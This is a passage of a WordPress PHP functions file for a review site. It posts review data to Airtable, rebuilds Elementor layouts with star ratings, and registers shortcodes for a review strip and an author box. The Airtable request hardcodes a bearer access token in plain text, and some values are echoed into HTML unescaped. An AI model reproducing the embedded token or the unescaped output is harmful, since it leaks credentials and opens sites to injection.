                                            "Average Rating" => htmlspecialchars(esc_html($average_rating)),
                                            "URL" => $url
                                        ),
                                        "typecast" => true
                                    );
                                // Initialize cURL session
                                $curl = curl_init();

                                // Set cURL options
                                curl_setopt($curl, CURLOPT_URL, 'https://api.airtable.com/v0/app6KyWOqgH86K840/tblEAtMHlW4vEte9S');

                                curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                                curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'POST');
                                curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($post_data)); // Set JSON data as POST data
                                curl_setopt($curl, CURLOPT_HTTPHEADER, array(
                                    'Content-Type: application/json',
                                    'Authorization: Bearer pat7plG7XNlMwFHS9.15891d84ceb3d842d2394fe5920626b9115d94c1a7a7ae278cf5ec95c320c977',
                                ));

                                // Execute the cURL request
                                $response = curl_exec($curl);
                                // Check for cURL errors
                                if (curl_errno($curl)) {
                                    echo 'cURL Error: ' . curl_error($curl);
                                    wp_die( curl_error($curl));
                                }

                                // Close the cURL session
                                curl_close($curl);
                                $el++;
                        }
                    }

	    }

        $jsondata = get_post_meta($post_id, '_elementor_data', true);

        $data_array = json_decode($jsondata, true);


        $jayParsedAry[] = $data_array[0];

        $i = 0 ;
        $first_it = true; // Flag to track the first iteration
        $count = count($data_array);
        foreach ($data_array as $key => $value) {
            if ($first_it) {
                $first_it = false; // Set the flag to false after the first iteration
                continue; // Skip processing for the first element
            }
            if ($key === $count - 1) {
                continue; // Skip processing for the last element
            }
            if($value['elements'][0]['elements'][0]['settings']['select_partner']){
                $title = $value['elements'][0]['elements'][0]['settings']['select_partner'];
            }else{
                $title = $value['elements'][0]['elements'][0]['settings']['partner_title'];
            }
            $logo_url =  $value['elements'][0]['elements'][3]['elements'][0]['elements'][0]['settings']['image']['url'];

            $logo_id =  $value['elements'][0]['elements'][3]['elements'][0]['elements'][0]['settings']['image']['id'];
            $Quoten = $value['elements'][0]['elements'][5]['settings']['blockquote_content'];
            $article_content = trim($value['elements'][0]['elements'][3]['elements'][0]['elements'][1]['settings']['editor']);

            $rating1= $value['elements'][0]['elements'][4]['elements'][1]['elements'][0]['settings']['title'];
            $rating2 = $value['elements'][0]['elements'][4]['elements'][1]['elements'][1]['settings']['title'];
            $rating3 = $value['elements'][0]['elements'][4]['elements'][1]['elements'][2]['settings']['title'];
            $rating4 = $value['elements'][0]['elements'][4]['elements'][1]['elements'][3]['settings']['title'];

            $rate1 = $value['elements'][0]['elements'][4]['elements'][1]['elements'][0]['settings']['rating'];
            $rate2 = $value['elements'][0]['elements'][4]['elements'][1]['elements'][1]['settings']['rating'];
            $rate3 = $value['elements'][0]['elements'][4]['elements'][1]['elements'][2]['settings']['rating'];
            $rate4 = $value['elements'][0]['elements'][4]['elements'][1]['elements'][3]['settings']['rating'];

            $elements =  $value['elements'][0]['elements'][6]['elements'];
            // Convert to float if needed
            $rate1 = (float)$rate1;
            $rate2 = (float)$rate2;
            $rate3 = (float)$rate3;
            $rate4 = (float)$rate4;

            // Validate data before calculation
            if (is_numeric($rate1) && is_numeric($rate2) && is_numeric($rate3) && is_numeric($rate4)) {
                // Perform calculations
                $total = $rate1 + $rate2 + $rate3 + $rate4;
            }

            $elements_stars = $rating1= $value['elements'][0]['elements'][4]['elements'][1]['elements'];
            $rating = $total / 4;
            $average_rating = round($rating,1);
            // Calculate the percentage (assuming that the maximum possible value is 20)
            $percentage = ($total * 100) / 20;

            $container_element =
                [
                    "id" => uniqid(),
                    "elType" => "section",
                    "settings" => [
                        "element_pack_agbg_color_list" => [
                            [
                                "_id" => "b534852",
                            ],
                            [
                                "start_color" => "#567445",
                                "end_color" => "#1D1BE0",
                                "_id" => "f325d28",
                            ],
                        ],
                        "css_classes" => "at-section-blocks",
                    ],
                    "elements" => [
                        [
                        "id" => "2bedaa15",
                        "elType" => "column",
                        "settings" => [
                            "_column_size" => 100,
                            "_inline_size" => null,
                        ],
                        "elements" => [
                            [
                                "id" => "6f07a65",
                                "elType" => "widget",
                                "settings" => [
                                    "select_partner" => $title,
                                    "element_pack_widget_tooltip_text" =>
                                        "This is Tooltip",
                                    "element_pack_widget_effect_transition_duration" =>
                                        "300",
                                    "element_pack_widget_effect_transition_easing" =>
                                        "ease-out",
                                    "_css_classes" => "airtable-main-title",
                                    "_element_id" =>  str_replace(' ', '-', trim(esc_html( $title))),
                                ],
                                "elements" => [],
                                "widgetType" => "oembed",
                            ],
                            [
                                "id" => "2a324bc6",
                                "elType" => "widget",
                                "settings" => [
                                    "title" => "Best Enterprise CRM Software.",
                                    "header_size" => "h5",
                                    "element_pack_widget_tooltip_text" =>
                                        "This is Tooltip",
                                    "element_pack_widget_effect_transition_duration" =>
                                        "300",
                                    "element_pack_widget_effect_transition_easing" =>
                                        "ease-out",
                                    "typography_typography" => "custom",
                                    "typography_font_family" => "Nunito",
                                    "typography_font_size" => [
                                        "unit" => "px",
                                        "size" => 24,
                                        "sizes" => [],
                                    ],
                                    "typography_font_weight" => "700",
                                    "_css_classes" => "airtable-sub-title",
                                ],
                                "elements" => [],
                                "widgetType" => "heading",
                            ],
                            [
                                "id" => "632aa25",
                                "elType" => "section",
                                "settings" => [
                                    "element_pack_agbg_color_list" => [
                                        [
                                            "_id" => "6f76999",
                                        ],
                                        [
                                            "start_color" => "#567445",
                                            "end_color" => "#1D1BE0",
                                            "_id" => "35b0547",
                                        ],
                                    ],
                                    "css_classes" =>
                                        "sidebar-airtable airtable-reviews-list",
                                ],
                                "elements" => [
                                    [
                                        "id" => "284974e",
                                        "elType" => "column",
                                        "settings" => [
                                            "_column_size" => 100,
                                            "_inline_size" => null,
                                        ],
                                        "elements" => [
                                            [
                                                "id" => "9e4b042",
                                                "elType" => "widget",
                                                "settings" => [
                                                    "title" => "Featured Topic",
                                                    "header_size" => "h6",
                                                    "title_color" => "#444444",
                                                    "typography_typography" => "custom",
                                                    "typography_font_family" =>
                                                        "Nunito",
                                                    "typography_font_weight" => "400",
                                                    "_css_classes" =>
                                                        "airtable-reviews-top",
                                                    "element_pack_widget_tooltip_text" =>
                                                        "This is Tooltip",
                                                    "element_pack_widget_effect_transition_duration" =>
                                                        "300",
                                                    "element_pack_widget_effect_transition_easing" =>
                                                        "ease-out",
                                                ],
                                                "elements" => [],
                                                "widgetType" => "heading",
                                            ],
                                            [
                                                "id" => "452d5e9",
                                                "elType" => "widget",
                                                "settings" => [
                                                    "image" => [
                                                        "url" =>
                                                            $logo_url,
                                                        "id" => $logo_id,
                                                        "size" => "",
                                                        "alt" => "",
                                                        "source" => "library",
                                                    ],
                                                    "image_size" => "full",
                                                    "_css_classes" =>
                                                        "airtable-reviews-img",
                                                    "element_pack_widget_tooltip_text" =>
                                                        "This is Tooltip",
                                                    "element_pack_widget_effect_transition_duration" =>
                                                        "300",
                                                    "element_pack_widget_effect_transition_easing" =>
                                                        "ease-out",
                                                ],
                                                "elements" => [],
                                                "widgetType" => "image",
                                            ],
                                            [
                                                "id" => "2ba9327",
                                                "elType" => "widget",
                                                "settings" => [
                                                    "title" => $title,
                                                    "header_size" => "h6",
                                                    "align" => "center",
                                                    "title_color" => "#444444",
                                                    "typography_typography" => "custom",
                                                    "typography_font_family" =>
                                                        "Nunito",
                                                    "typography_font_weight" => "400",
                                                    "_padding" => [
                                                        "unit" => "px",
                                                        "top" => "15",
                                                        "right" => "0",
                                                        "bottom" => "0",
                                                        "left" => "0",
                                                        "isLinked" => false,
                                                    ],
                                                    "_css_classes" =>
                                                        "airtable-reviews-middle",
                                                    "element_pack_widget_tooltip_text" =>
                                                        "This is Tooltip",
                                                    "element_pack_widget_effect_transition_duration" =>
                                                        "300",
                                                    "element_pack_widget_effect_transition_easing" =>
                                                        "ease-out",
                                                ],
                                                "elements" => [],
                                                "widgetType" => "heading",
                                            ],
                                            [
                                                "id" => "e26dc80",
                                                "elType" => "widget",
                                                "settings" => [
                                                    "star_style" => "star_unicode",
                                                    "align" => "center",
                                                    "icon_size" => [
                                                        "unit" => "px",
                                                        "size" => 15,
                                                        "sizes" => [],
                                                    ],
                                                    "element_pack_widget_tooltip_text" =>
                                                        "This is Tooltip",
                                                    "element_pack_widget_effect_transition_duration" =>
                                                        "300",
                                                    "element_pack_widget_effect_transition_easing" =>
                                                        "ease-out",
                                                    "rating" => $average_rating
                                                ],
                                                "elements" => [],
                                                "widgetType" => "star-rating",
                                            ],
                                            [
                                                "id" => "42720ba",
                                                "elType" => "widget",
                                                "settings" => [
                                                    "text" => "Visit Site",
                                                    "align" => "center",
                                                    "typography_typography" => "custom",
                                                    "typography_font_family" =>
                                                        "Roboto",
                                                    "typography_font_weight" => "500",
                                                    "typography_text_decoration" =>
                                                        "none",
                                                    "text_padding" => [
                                                        "unit" => "px",
                                                        "top" => "7",
                                                        "right" => "30",
                                                        "bottom" => "7",
                                                        "left" => "30",
                                                        "isLinked" => false,
                                                    ],
                                                    "_css_classes" =>
                                                        "airtable-reviews-button",
                                                    "element_pack_widget_tooltip_text" =>
                                                        "This is Tooltip",
                                                    "element_pack_widget_effect_transition_duration" =>
                                                        "300",
                                                    "element_pack_widget_effect_transition_easing" =>
                                                        "ease-out",
                                                ],
                                                "elements" => [],
                                                "widgetType" => "button",
                                            ],
                                            [
                                                "id" => "ceeeffe",
                                                "elType" => "widget",
                                                "settings" => [
                                                    "text" => "Read Full Review",
                                                    "align" => "center",
                                                    "selected_icon" => [
                                                        "value" => "fas fa-arrow-right",
                                                        "library" => "fa-solid",
                                                    ],
                                                    "icon_align" => "right",
                                                    "icon_indent" => [
                                                        "unit" => "px",
                                                        "size" => 10,
                                                        "sizes" => [],
                                                    ],
                                                    "typography_typography" => "custom",
                                                    "typography_font_family" =>
                                                        "Roboto",
                                                    "typography_font_weight" => "500",
                                                    "typography_text_decoration" =>
                                                        "none",
                                                    "button_text_color" => "#444444",
                                                    "background_color" => "#FB637E00",
                                                    "element_pack_widget_tooltip_text" =>
                                                        "This is Tooltip",
                                                    "element_pack_widget_effect_transition_duration" =>
                                                        "300",
                                                    "element_pack_widget_effect_transition_easing" =>
                                                        "ease-out",
                                                ],
                                                "elements" => [],
                                                "widgetType" => "button",
                                            ],
                                        ],
                                        "isInner" => true,
                                    ],
                                ],
                                "isInner" => true,
                            ],
                            [
                                "id" => "b5ce2b7",
                                "elType" => "section",
                                "settings" => [
                                    "element_pack_agbg_color_list" => [
                                        [
                                            "_id" => "ea39be5",
                                        ],
                                        [
                                            "start_color" => "#567445",
                                            "end_color" => "#1D1BE0",
                                            "_id" => "56696c1",
                                        ],
                                    ],
                                    "css_classes" => "airtable-top-block",
                                ],
                                "elements" => [
                                    [
                                        "id" => "91f8d05",
                                        "elType" => "column",
                                        "settings" => [
                                            "_column_size" => 100,
                                            "_inline_size" => null,
                                        ],
                                        "elements" => [
                                            [
                                                "id" => "7c26bf3f",
                                                "elType" => "widget",
                                                "settings" => [
                                                    "image" => [
                                                        "url" =>
                                                            $logo_url,
                                                        "id" => $logo_id,
                                                        "size" => "",
                                                        "alt" => "",
                                                        "source" => "library",
                                                    ],
                                                    "image_size" => "medium",
                                                    "align" => "center",
                                                    "element_pack_widget_tooltip_text" =>
                                                        "This is Tooltip",
                                                    "element_pack_widget_effect_transition_duration" =>
                                                        "300",
                                                    "element_pack_widget_effect_transition_easing" =>
                                                        "ease-out",
                                                ],
                                                "elements" => [],
                                                "widgetType" => "image",
                                            ],
                                            [
                                                "id" => "53225e1",
                                                "elType" => "widget",
                                                "settings" => [
                                                    "element_pack_widget_tooltip_text" =>
                                                        "This is Tooltip",
                                                    "element_pack_widget_effect_transition_duration" =>
                                                        "300",
                                                    "element_pack_widget_effect_transition_easing" =>
                                                        "ease-out",
                                                    "editor" =>
                                                    convertAllSpecialToUnicode($article_content),
                                                ],
                                                "elements" => [],
                                                "widgetType" => "text-editor",
                                            ],
                                        ],
                                        "isInner" => true,
                                    ],
                                ],
                                "isInner" => true,
                            ],
                            [
                                "id" => "36df2dba",
                                "elType" => "section",
                                "settings" => [
                                    "structure" => "20",
                                    "element_pack_agbg_color_list" => [
                                        [
                                            "_id" => "3ee4b44",
                                        ],
                                        [
                                            "start_color" => "#567445",
                                            "end_color" => "#1D1BE0",
                                            "_id" => "3a3c717",
                                        ],
                                    ],
                                    "css_classes" => "airtable-bottom-block",
                                ],
                                "elements" => [
                                    [
                                        "id" => "5d1dafe6",
                                        "elType" => "column",
                                        "settings" => [
                                            "_column_size" => 50,
                                            "_inline_size" => null,
                                            "css_classes" => "data-progress",
                                        ],
                                        "elements" => [
                                            [
                                                "id" => "83428d5",
                                                "elType" => "widget",
                                                "settings" => [
                                                    "title" => "",
                                                    "element_pack_widget_tooltip_text" =>
                                                        "This is Tooltip",
                                                    "element_pack_widget_effect_transition_duration" =>
                                                        "300",
                                                    "element_pack_widget_effect_transition_easing" =>
                                                        "ease-out",
                                                    "_title" => "Progress Pie",
                                                    "percent" =>  $percentage,
                                                    "before" => $average_rating,
                                                    "text" => "Out of 5",
                                                ],
                                                "elements" => [],
                                                "widgetType" => "bdt-progress-pie",
                                            ],
                                        ],
                                        "isInner" => true,
                                    ],
                                    [
                                        "id" => "76d6a0c3",
                                        "elType" => "column",
                                        "settings" => [
                                            "_column_size" => 50,
                                            "_inline_size" => null,
                                        ],
                                        // "elements" => [
                                        //     [
                                        //         "id" => "478d14b9",
                                        //         "elType" => "widget",
                                        //         "settings" => [
                                        //             "star_style" => "star_unicode",
                                        //             "title" => $rating1,
                                        //             "rating" => $rate1,
                                        //             "element_pack_widget_tooltip_text" =>
                                        //                 "This is Tooltip",
                                        //             "element_pack_widget_effect_transition_duration" =>
                                        //                 "300",
                                        //             "element_pack_widget_effect_transition_easing" =>
                                        //                 "ease-out",
                                        //         ],
                                        //         "elements" => [],
                                        //         "widgetType" => "star-rating",
                                        //     ],
                                        //     [
                                        //         "id" => "6ad144d",
                                        //         "elType" => "widget",
                                        //         "settings" => [
                                        //             "star_style" => "star_unicode",
                                        //             "title" => $rating2,
                                        //             "rating" => $rate2,
                                        //             "element_pack_widget_tooltip_text" =>
                                        //                 "This is Tooltip",
                                        //             "element_pack_widget_effect_transition_duration" =>
                                        //                 "300",
                                        //             "element_pack_widget_effect_transition_easing" =>
                                        //                 "ease-out",
                                        //         ],
                                        //         "elements" => [],
                                        //         "widgetType" => "star-rating",
                                        //     ],
                                        //     [
                                        //         "id" => "3c26c3c5",
                                        //         "elType" => "widget",
                                        //         "settings" => [
                                        //             "star_style" => "star_unicode",
                                        //             "title" => $rating3,
                                        //             "rating" => $rate3,
                                        //             "element_pack_widget_tooltip_text" =>
                                        //                 "This is Tooltip",
                                        //             "element_pack_widget_effect_transition_duration" =>
                                        //                 "300",
                                        //             "element_pack_widget_effect_transition_easing" =>
                                        //                 "ease-out",
                                        //         ],
                                        //         "elements" => [],
                                        //         "widgetType" => "star-rating",
                                        //     ],
                                        //     [
                                        //         "id" => "249a342",
                                        //         "elType" => "widget",
                                        //         "settings" => [
                                        //             "star_style" => "star_unicode",
                                        //             "title" => $rating4,
                                        //             "rating" => $rate4,
                                        //             "element_pack_widget_tooltip_text" =>
                                        //                 "This is Tooltip",
                                        //             "element_pack_widget_effect_transition_duration" =>
                                        //                 "300",
                                        //             "element_pack_widget_effect_transition_easing" =>
                                        //                 "ease-out",
                                        //         ],
                                        //         "elements" => [],
                                        //         "widgetType" => "star-rating",
                                        //     ],
                                        //     [
                                        //         "id" => "0778e45",
                                        //         "elType" => "widget",
                                        //         "settings" => [
                                        //             "text" => "Read More",
                                        //             "element_pack_widget_tooltip_text" =>
                                        //                 "This is Tooltip",
                                        //             "element_pack_widget_effect_transition_duration" =>
                                        //                 "300",
                                        //             "element_pack_widget_effect_transition_easing" =>
                                        //                 "ease-out",
                                        //         ],
                                        //         "elements" => [],
                                        //         "widgetType" => "button",
                                        //     ],
                                        // ],
                                        "isInner" => true,
                                        "elements" => $elements_stars
                                    ],
                                ],
                                "isInner" => true,
                            ],
                            [
                                "id" => uniqid(),
                                "elType" => "widget",
                                "settings" => [
                                    "blockquote_skin" => "quotation",
                                    "blockquote_content" => convertAllSpecialToUnicode($Quoten) ,
                                    "author_name" => "",
                                    "tweet_button" => "",
                                    "tweet_button_view" => "text",
                                    "tweet_button_skin" => "link",
                                    "tweet_button_label" => "",
                                    "url_type" => "none",
                                    "element_pack_widget_tooltip_text" =>
                                        "This is Tooltip",
                                    "element_pack_widget_effect_transition_duration" =>
                                        "300",
                                    "element_pack_widget_effect_transition_easing" =>
                                        "ease-out",
                                ],
                                "elements" => [],
                                "widgetType" => "blockquote",
                            ],
                            [
                                "id" => "5c09c5c",
                                "elType" => "section",
                                "settings" => [
                                    "element_pack_agbg_color_list" => [
                                        [
                                            "_id" => "b64f1bd",
                                        ],
                                        [
                                            "start_color" => "#567445",
                                            "end_color" => "#1D1BE0",
                                            "_id" => "d2a90c7",
                                        ],
                                    ],
                                ],
                                "elements" => $elements,
                                "isInner" => true,
                            ],
                        ],
                        "isInner" => false,
                    ]
                ],
                    "isInner" => false,
            ];
            $jayParsedAry[] = $container_element;
            $i++;
            }
        // Move the array pointer to the last element
        end($data_array);

        // Get the value of the last element
        $lastElement = current($data_array);

        // Add the last element to $jayParsedAry
        $jayParsedAry[] = $lastElement;
            $update_el_data = json_encode($jayParsedAry);
            unset($jayParsedAry);
            update_post_meta($post_id,'_elementor_data',$update_el_data );
    }

    // Adds a new sortable "last updated" column to posts and pages backend.

    function custom_columns($defaults) {
        $defaults['last_updated'] = __('Last Updated', 'your-textdomain');
        return $defaults;
    }
    add_filter('manage_posts_columns', 'custom_columns');
    add_filter('manage_pages_columns', 'custom_columns');

    function custom_columns_content($column_name, $post_id) {
        if ($column_name == 'last_updated') {
            $last_updated = get_the_modified_date();
            echo $last_updated;
        }
    }
    add_action('manage_posts_custom_column', 'custom_columns_content', 10, 2);
    add_action('manage_pages_custom_column', 'custom_columns_content', 10, 2);

    function custom_columns_sortable($columns) {
        $columns['last_updated'] = 'last_updated';
        return $columns;
    }
    add_filter('manage_edit-post_sortable_columns', 'custom_columns_sortable');
    add_filter('manage_edit-page_sortable_columns', 'custom_columns_sortable');

    function custom_columns_orderby($query) {
        if (!is_admin()) {
            return;
        }

        $orderby = $query->get('orderby');

        if ('last_updated' == $orderby) {
            $query->set('orderby', 'modified');
        }
    }
    add_action('pre_get_posts', 'custom_columns_orderby');

// Function to generate the shortcode output
function custom_reviews_shortcode_function() {
    $current_post_id = get_the_ID(); // Get the current post ID

    // Fetch and process your data here
    // Replace this section with your actual data retrieval and processing logic

    $output = ''; // Initialize the output variable

    // Your existing code goes here...
    ob_start(); // Start output buffering
    ?>
  <div class="airtable-reviews-list elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-5631bef0">
   <div class="elementor-widget-wrap elementor-element-populated">
      <section class="elementor-section elementor-inner-section elementor-element elementor-element-5e41d5b7 elementor-section-content-space-between elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="5e41d5b7" data-element_type="section">
         <div class="elementor-container elementor-column-gap-default">
			<?php
			$json_data = get_post_meta($current_post_id, '_elementor_data', true);

			if (is_string($json_data)) {
				$data = json_decode($json_data, true);

				if ($data === null && json_last_error() !== JSON_ERROR_NONE) {
					// There was an error decoding the JSON.
					// Handle the error as needed.
				}
			$post_count = 0; // Initialize a counter
			$first_iteration = true; // Flag to track the first iteration
            $count = count($data);
            $total = $count - 2;
			foreach ($data as $element) {
				if ($post_count >= 5) {
					break; // Exit the loop if we've reached 5 posts
				}
				if ($first_iteration) {
					$first_iteration = false; // Set the flag to false after the first iteration
					continue; // Skip processing for the first element
				}
                if($post_count === $total){
                    continue; // Skip processing for the last element
                }
				$title = $element['elements'][0]['elements'][0]['settings']['select_partner'];
				$content = $element['elements'][0]['elements'][1]['settings']['title'];
				$logo_url = $element['elements'][0]['elements'][3]['elements'][0]['elements'][0]['settings']['image']['url'];

				$list_rate1 = $element['elements'][0]['elements'][4]['elements'][1]['elements'][0]['settings']['rating'];
                $list_rate2 = $element['elements'][0]['elements'][4]['elements'][1]['elements'][1]['settings']['rating'];
                $list_rate3 = $element['elements'][0]['elements'][4]['elements'][1]['elements'][2]['settings']['rating'];
                $list_rate4 = $element['elements'][0]['elements'][4]['elements'][1]['elements'][3]['settings']['rating'];

                $list_rate1 = intval($list_rate1);
                $list_rate2 = intval($list_rate2);
                $list_rate3 = intval($list_rate3);
                $list_rate4 = intval($list_rate4);

                $average_rating = ($list_rate1 + $list_rate2 + $list_rate3 + $list_rate4) / 4;

                $featured_text = '';
                if($post_count == '0'){
                    $featured_text = 'Best Overall';
                }
                if($post_count == '1'){
                    $featured_text = 'Efficiency';
                }
                if($post_count == '2'){
                    $featured_text = 'Value';
                }
                if($post_count == '3'){
                    $featured_text = 'Easy to Use';
                }
                if($post_count == '4'){
                    $featured_text = 'Easy to Set Up';
                }

				?>
				<div class="elementor-column elementor-col-20 elementor-inner-column elementor-element elementor-element-637650a1" data-id="637650a1" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
							<div class="elementor-widget-wrap elementor-element-populated">
								<div class="airtable-reviews-top elementor-element elementor-element-746d3b50 elementor-widget elementor-widget-heading" data-id="746d3b50" data-element_type="widget" data-widget_type="heading.default">
									<div class="elementor-widget-container">
										<h6 class="elementor-heading-title elementor-size-default"><?php echo $featured_text;?></h6>
										<p></p>
									</div>
								</div>
								<div class="airtable-reviews-img elementor-element elementor-element-1e7970ba elementor-widget__width-auto content-bottom-p elementor-widget elementor-widget-image" data-id="1e7970ba" data-element_type="widget" data-widget_type="image.default">
									<div class="elementor-widget-container">
										<img decoding="async" width="100" height="100" src="<?php echo $logo_url;?>" class="attachment-full size-full wp-image-30588" alt="" loading="lazy">
									</div>
								</div>
								<div class="airtable-reviews-middle elementor-element elementor-element-1a57e45d elementor-widget elementor-widget-heading" data-id="1a57e45d" data-element_type="widget" data-widget_type="heading.default">
									<div class="elementor-widget-container">
										<h4 class="elementor-heading-title elementor-size-default"><?php echo $title; ?></h4>
										<p></p>
									</div>
								</div>
								<div class="rating">
								    <div class="rating-value">
									<?php
										echo $average_rating;
									?>
									</div>
									<?php
										for ($i = 1; $i <= 5; $i++) :
											$starClass = ($i <= $average_rating) ? 'checked' : '';
											if (is_float($average_rating) && $i == ceil($average_rating)) {
												$rateStar = 'fa-star-half-full';
											} else {
												$rateStar = 'fa-star';
											}
										?>
										<span class="fa <?php echo $rateStar; ?> <?php echo $starClass; ?>"></span>
										<style>
											.checked, .fa-star-half-full {
												color: orange;
											}
										</style>
									<?php endfor; ?>

								</div>
								<div class="airtable-reviews-content elementor-element elementor-element-7826292f content-bottom-p elementor-widget elementor-widget-text-editor" data-id="7826292f" data-element_type="widget" data-widget_type="text-editor.default">
									<div class="elementor-widget-container">
										<style>/*! elementor - v3.16.0 - 14-09-2023 */
										.elementor-widget-text-editor.elementor-drop-cap-view-stacked .elementor-drop-cap{background-color:#69727d;color:#fff}.elementor-widget-text-editor.elementor-drop-cap-view-framed .elementor-drop-cap{color:#69727d;border:3px solid;background-color:transparent}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap{margin-top:8px}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap-letter{width:1em;height:1em}.elementor-widget-text-editor .elementor-drop-cap{float:left;text-align:center;line-height:1;font-size:50px}.elementor-widget-text-editor .elementor-drop-cap-letter{display:inline-block}
										</style>
										<p>	<?php echo wp_trim_words( $content, 20, '...' ); ?> </p>
									</div>
								</div>
								<div class="airtable-reviews-button elementor-element elementor-element-4821d3c3 elementor-align-center elementor-widget elementor-widget-button" data-id="4821d3c3" data-element_type="widget" data-widget_type="button.default">
									<div class="elementor-widget-container">
										<div class="elementor-button-wrapper">
										<a class="elementor-button elementor-button-link elementor-size-sm" href="#" target="_blank"><br>
										<span class="elementor-button-content-wrapper"><br>
										<span class="elementor-button-text">Visit Site</span><br>
										</span><br>
										</a>
										</div>
									</div>
								</div>
								<div class="airtable-reviews-link elementor-element elementor-element-36f91b7f elementor-align-center elementor-widget elementor-widget-button" data-id="36f91b7f" data-element_type="widget" data-widget_type="button.default">
									<div class="elementor-widget-container">
										<div class="elementor-button-wrapper">
										<a class="elementor-button elementor-button-link elementor-size-sm" href="#<?php echo str_replace(' ', '-', trim( $title));?>"><br>
										<span class="elementor-button-content-wrapper"><br>
										<span class="elementor-button-icon elementor-align-icon-right"><br>
										<i aria-hidden="true" class="fas fa-arrow-right"></i>			</span><br>
										<span class="elementor-button-text">Read Full Review</span><br>
										</span><br>
										</a>
										</div>
									</div>
								</div>
							</div>
							</div>
			<?php
				$post_count++; // Increment the post counter
			}
	 	} ?>
         </div>
      </section>
   </div>
</div>
    <?php
    $output = ob_get_clean(); // Get the buffer contents and clean the buffer

    return $output; // Return the shortcode output
}

// Register the shortcode
function register_custom_reviews_shortcode() {
    add_shortcode('mini_container', 'custom_reviews_shortcode_function');
}
add_action('init', 'register_custom_reviews_shortcode');

// Custom shortcode to display current post title in h1 tag
function get_post_title_as_h1() {
    // Check if we are inside the WordPress loop
    if (is_single() || is_page()) {
        $post_title = get_the_title(); // Get the current post's title
        return '<h1>' . esc_html($post_title) . '</h1>'; // Return the title wrapped in h1 tag
    }
}
add_shortcode('current_post_title', 'get_post_title_as_h1'); // Define the shortcode name

// Custom shortcode to display author meta information
function author_meta_shortcode() {
    global $post;

    // Get the post author's data
    $author_id = $post->post_author;
    $author_name = get_the_author_meta('display_name', $author_id);
    $author_headshot = get_avatar($author_id, 80); // Change '80' to the desired image size

    // Get the updated date of the post
    $updated_date = get_the_modified_date();

    // Construct the output
    $output = '<div class="author-meta">';
    $output .= '<div class="author-headshot">' . $author_headshot . '</div>';
    $output .= '<div class="author-name">' . esc_html($author_name) . '</div>';
    $output .= '<div class="updated-date">Updated Date: ' . esc_html($updated_date) . '</div>';
    $output .= '</div>';

    return $output;
}
add_shortcode('authermeta', 'author_meta_shortcode'); // Define the shortcode name
